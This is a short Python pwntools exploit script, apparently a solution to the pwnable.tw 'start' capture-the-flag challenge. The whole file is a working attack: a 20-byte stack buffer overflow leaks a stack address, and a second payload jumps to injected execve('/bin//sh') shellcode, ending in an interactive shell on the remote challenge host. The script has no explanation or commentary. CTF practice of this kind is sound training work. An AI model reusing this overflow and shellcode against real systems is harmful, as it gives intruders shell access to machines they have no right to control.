#!/usr/bin/env python
import os
import sys
from pwn import *

libc_path =''
if os.path.exists('./libc.so.6'):
    libc_path = './libc.so.6'
else:
    libc_path ='/lib/x86_64-linux-gnu/libc.so.6'
elf_libc = ELF(libc_path)
context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
host = 'chall.pwnable.tw'
port = 10000

if len(sys.argv) > 1:
    r = remote(host,port)
else:
    r = process('start',env={'LD_PRELOAD': libc_path})
elf = ELF('start')
#  gdb.attach(proc.pidof(r)[0])


sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
print len(sc)
offset = 20

r.sendafter(':','a'*20 + p32(0x08048087))
stack =  u32(r.recv(4))

r.send('a'*20 + p32(stack+20) + 'a'*10 + sc)





r.interactive()
